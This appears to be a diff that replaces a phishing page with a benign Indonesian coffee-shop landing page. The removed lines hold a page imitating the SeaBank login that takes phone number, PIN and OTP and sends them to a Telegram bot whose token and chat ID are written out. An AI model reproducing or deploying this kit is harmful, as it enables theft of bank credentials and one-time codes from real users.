@@ -1,217 +1,238 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-<title>Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kopi Senja - Rasakan Kehangatan Sejati</title>
+    <style>
+        /* Base Setup */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background: #ffffff;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: flex-start;
-        min-height: 100vh;
-    }
+        body {
+            background-color: #fcfbf7;
+            color: #333;
+            line-height: 1.6;
+        }
 
-    .container {
-        width: 100%;
-        max-width: 420px;
-        padding: 25px;
-        text-align: center;
-    }
+        /* Navbar */
+        header {
+            background-color: #fff;
+            padding: 20px 10%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
 
-    .logo {
-        width: 55%;
-        max-width: 230px;
-        margin: 10px auto 20px;
-    }
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #8c6239;
+            text-decoration: none;
+        }
 
-    h2 {
-        font-size: 18px;
-        font-weight: 600;
-        color: #333;
-        margin-bottom: 20px;
-    }
+        nav a {
+            margin-left: 20px;
+            text-decoration: none;
+            color: #555;
+            font-weight: 500;
+            transition: 0.3s;
+        }
 
-    input {
-        width: 100%;
-        padding: 16px;
-        border: none;
-        border-radius: 12px;
-        background: #f7f8fa;
-        margin-bottom: 14px;
-        font-size: 16px;
-        box-sizing: border-box;
-    }
+        nav a:hover {
+            color: #8c6239;
+        }
 
-    .forgot {
-        display: block;
-        text-align: right;
-        margin-bottom: 20px;
-        font-size: 14px;
-        color: #0066ff;
-        text-decoration: none;
-    }
+        /* Hero Section */
+        .hero {
+            padding: 100px 10%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 40px;
+            min-height: 80vh;
+        }
 
-    .btn {
-        width: 100%;
-        padding: 16px;
-        font-size: 18px;
-        border: none;
-        border-radius: 14px;
-        background: #FF6B00;
-        color: white;
-        cursor: pointer;
-        transition: 0.2s;
-    }
+        .hero-text {
+            flex: 1;
+        }
 
-    .btn:active {
-        background: #d45a00;
-        transform: scale(0.97);
-    }
+        .hero-text h1 {
+            font-size: 48px;
+            color: #2c1d11;
+            line-height: 1.2;
+            margin-bottom: 20px;
+        }
 
-    #otpPage, #successPage {
-        display: none;
-    }
+        .hero-text p {
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 30px;
+        }
 
-    .otp-box {
-        display: flex;
-        justify-content: center;
-        gap: 8px;
-        margin-top: 15px;
-    }
+        .btn-cta {
+            background-color: #8c6239;
+            color: #fff;
+            padding: 15px 30px;
+            text-decoration: none;
+            font-weight: 600;
+            border-radius: 8px;
+            display: inline-block;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(140, 98, 57, 0.3);
+        }
 
-    .otp-input {
-        width: 45px;
-        height: 55px;
-        font-size: 22px;
-        text-align: center;
-        border: 2px solid #ddd;
-        border-radius: 10px;
-    }
+        .btn-cta:hover {
+            background-color: #6f4e2d;
+            transform: translateY(-2px);
+        }
 
-    @media (max-width: 380px) {
-        .otp-input {
-            width: 40px;
-            height: 50px;
+        .hero-image {
+            flex: 1;
+            text-align: center;
+        }
+
+        /* Ilustrasi lingkaran pengganti gambar eksternal agar aman dan rapi */
+        .placeholder-art {
+            width: 350px;
+            height: 350px;
+            background: linear-gradient(135deg, #e6cca7 0%, #8c6239 100%);
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        /* Features Section */
+        .features {
+            background-color: #fff;
+            padding: 80px 10%;
+            text-align: center;
+        }
+
+        .features h2 {
+            font-size: 32px;
+            color: #2c1d11;
+            margin-bottom: 40px;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+
+        .feature-card {
+            padding: 30px;
+            border: 1px solid #f0e6df;
+            border-radius: 12px;
+            background: #fdfcfb;
+            transition: 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+        }
+
+        .feature-card h3 {
+            color: #8c6239;
+            margin-bottom: 15px;
             font-size: 20px;
         }
-    }
-</style>
+
+        .feature-card p {
+            color: #777;
+            font-size: 15px;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #2c1d11;
+            color: #fcfbf7;
+            text-align: center;
+            padding: 30px;
+            font-size: 14px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .hero {
+                flex-direction: column;
+                text-align: center;
+                padding: 60px 5%;
+            }
+
+            .hero-text h1 {
+                font-size: 36px;
+            }
+
+            .placeholder-art {
+                width: 250px;
+                height: 250px;
+            }
+
+            header {
+                padding: 20px 5%;
+            }
+        }
+    </style>
 </head>
-
 <body>
-<div class="container">
 
-    <!-- LOGIN PAGE -->
-    <div id="loginPage">
-        <img src="https://nvme2.natanetwork.id:2083/cpsess3095982347/frontend/jupiter/filemanager/showfile.html?file=lg-65e38a526d27d-SeaBank.webp&fileop=&dir=%2Fhome%2Fziideve1%2Fpublic_html&dirop=&charset=&file_charset=&baseurl=&basedir=" class="logo">
+    <!-- NAVBAR -->
+    <header>
+        <a href="#" class="logo">KopiSenja.</a>
+        <nav>
+            <a href="#tentang">Tentang</a>
+            <a href="#keunggulan">Keunggulan</a>
+            <a href="#kontak">Kontak</a>
+        </nav>
+    </header>
 
-        <h2>Log in dengan no. handphone</h2>
-
-        <input type="text" id="hp" placeholder="Nomor Handphone">
-
-        <input type="password" id="pin" maxlength="6" inputmode="numeric" placeholder="PIN">
-
-        <a class="forgot" href="#">Lupa PIN?</a>
-
-        <button class="btn" onclick="goOTP()">Log In</button>
-    </div>
-
-    <!-- OTP PAGE -->
-    <div id="otpPage">
-        <img src="https://nvme2.natanetwork.id:2083/cpsess3095982347/frontend/jupiter/filemanager/showfile.html?file=lg-65e38a526d27d-SeaBank.webp&fileop=&dir=%2Fhome%2Fziideve1%2Fpublic_html&dirop=&charset=&file_charset=&baseurl=&basedir=" class="logo">
-
-        <h2>Masukkan Kode OTP</h2>
-        <p style="font-size:14px; color:#666;">Kode OTP telah dikirim ke nomor Anda</p>
-
-        <div class="otp-box">
-            <input class="otp-input" maxlength="1">
-            <input class="otp-input" maxlength="1">
-            <input class="otp-input" maxlength="1">
-            <input class="otp-input" maxlength="1">
-            <input class="otp-input" maxlength="1">
-            <input class="otp-input" maxlength="1">
+    <!-- HERO SECTION -->
+    <section class="hero" id="tentang">
+        <div class="hero-text">
+            <h1>Awali Hari Anda dengan Cerita Terbaik</h1>
+            <p>Dibuat dari biji kopi pilihan nusantara yang dipanggang dengan penuh ketelitian untuk menghasilkan cita rasa yang kaya, lembut, dan tak terlupakan.</p>
+            <a href="#keunggulan" class="btn-cta">Jelajahi Rasa</a>
         </div>
+        <div class="hero-image">
+            <!-- Lingkaran grafis sebagai representasi visual modern -->
+            <div class="placeholder-art"></div>
+        </div>
+    </section>
 
-        <button class="btn" style="margin-top: 25px;" onclick="goSuccess()">Verifikasi</button>
-    </div>
+    <!-- FEATURES SECTION -->
+    <section class="features" id="keunggulan">
+        <h2>Mengapa Memilih Kami?</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>100% Biji Premium</h3>
+                <p>Kami hanya menggunakan biji kopi arabika dan robusta pilihan langsung dari petani lokal terbaik.</p>
+            </div>
+            <div class="feature-card">
+                <h3>Roasting Higienis</h3>
+                <p>Diproses menggunakan mesin modern berstandar tinggi untuk menjaga konsistensi rasa di setiap cangkir.</p>
+            </div>
+            <div class="feature-card">
+                <h3>Suasana Nyaman</h3>
+                <p>Setiap kedai kami dirancang khusus agar menjadi tempat terbaik untuk Anda bekerja maupun bersantai.</p>
+            </div>
+        </div>
+    </section>
 
-    <!-- SUCCESS PAGE -->
-    <div id="successPage">
-        <img src="https://nvme2.natanetwork.id:2083/cpsess3095982347/frontend/jupiter/filemanager/showfile.html?file=lg-65e38a526d27d-SeaBank.webp&fileop=&dir=%2Fhome%2Fziideve1%2Fpublic_html&dirop=&charset=&file_charset=&baseurl=&basedir=" class="logo">
-
-        <h2 style="font-size:22px; margin-top:20px;">Akun anda telah di verifikasi</h2>
-    </div>
-
-</div>
-
-<script>
-
-    /* 
-    const TG_TOKEN = "8679387125:AAGnUwe5XKJ275UmuYBY7d-gMmx4K3kPKSc";
-    const TG_CHAT_ID = "8580851235";
-
-    function sendToBot(msg) {
-        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: TG_CHAT_ID,
-                text: msg,
-                parse_mode: "HTML"
-            })
-        });
-    }
-
-    /* 
-    function goOTP() {
-        let hp = document.getElementById("hp").value.trim();
-        let pin = document.getElementById("pin").value.trim();
-
-        if (hp === "" || pin === "") {
-            alert("Harap isi nomor HP dan PIN");
-            return;
-        }
-
-        /* 
-        sendToBot(
-            `<b>📱 LOGIN</b>\n` +
-            `Nomor: <code>${hp}</code>\n` +
-            `PIN: <code>${pin}</code>`
-        );
-
-        document.getElementById("loginPage").style.display = "none";
-        document.getElementById("otpPage").style.display = "block";
-
-        document.querySelector(".otp-input").focus();
-    }
-
-    /* 
-    function goSuccess() {
-        let otp = "";
-        document.querySelectorAll(".otp-input").forEach(i => otp += i.value);
-
-        if (otp.length < 6) {
-            alert("OTP harus 6 digit");
-            return;
-        }
-
-        /* 
-        sendToBot(
-            `<b>🔐 OTP</b>\n` +
-            `Kode OTP: <code>${otp}</code>`
-        );
-
-        document.getElementById("otpPage").style.display = "none";
-        document.getElementById("successPage").style.display = "block";
-    }
-
-</script>
+    <!-- FOOTER -->
+    <footer id="kontak">
+        <p>&copy; 2026 Kopi Senja Indonesia. Seluruh Hak Cipta Dilindungi.</p>
+    </footer>
 
 </body>
 </html>
